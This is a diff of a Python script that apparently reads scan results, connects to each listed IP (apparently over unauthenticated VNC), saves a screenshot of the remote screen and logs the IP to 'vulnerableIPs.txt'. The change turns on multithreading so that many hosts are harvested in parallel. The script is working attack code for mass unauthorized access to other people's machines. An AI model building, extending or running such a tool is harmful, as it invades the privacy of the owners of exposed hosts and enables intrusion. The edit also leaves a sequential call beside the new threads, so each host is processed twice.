@@ -13,7 +13,7 @@ def parseLine(line):
         client = api.connect("{ip}:0".format(ip=parsedLine[3]))
         client.captureScreen('screenshot_IP_{ip}.png'.format(ip=parsedLine[3]))
         print('Got image from {ip}'.format(ip=parsedLine[3]))
-        with FileLock("vulnerableIPs.txt"): #this is done due to concurrency and multithreading
+        with FileLock("vulnerableIPs.txt"):
                 with open('vulnerableIPs.txt', 'a') as file:
                     file.write(parsedLine[3])
 
@@ -31,10 +31,9 @@ def main():
             for line in lines:
                 print(line)
                 parseLine(line)
-                ''' MULTITHREADING
                 thread = threading.Thread(target=parseLine,  kwargs={'line':line})
                 thread.start()    
-                '''
+
 
 if __name__ == '__main__':
     main()
